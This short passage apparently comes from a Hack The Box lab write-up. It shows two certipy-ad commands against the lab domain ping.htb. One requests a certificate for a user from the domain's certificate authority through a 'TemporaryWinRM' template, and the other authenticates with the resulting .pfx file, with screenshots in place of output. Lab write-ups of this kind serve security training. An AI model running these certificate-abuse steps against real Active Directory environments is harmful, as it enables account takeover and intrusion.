```zsh
certipy-ad req \
  -u c.roberts@ping.htb \
  -k -no-pass \
  -dc-ip 10.129.49.170 \
  -dc-host dc1.ping.htb \
  -target dc1.ping.htb \
  -ca PING-DC1-CA \
  -template TemporaryWinRM
```
![](../../../../../../assets/images/Pasted%20image%2020260523052904.png)

```zsh
certipy-ad auth -pfx c.roberts.pfx -domain ping.htb -dc-ip 10.129.49.170
```
![](../../../../../../assets/images/Pasted%20image%2020260523052915.png)

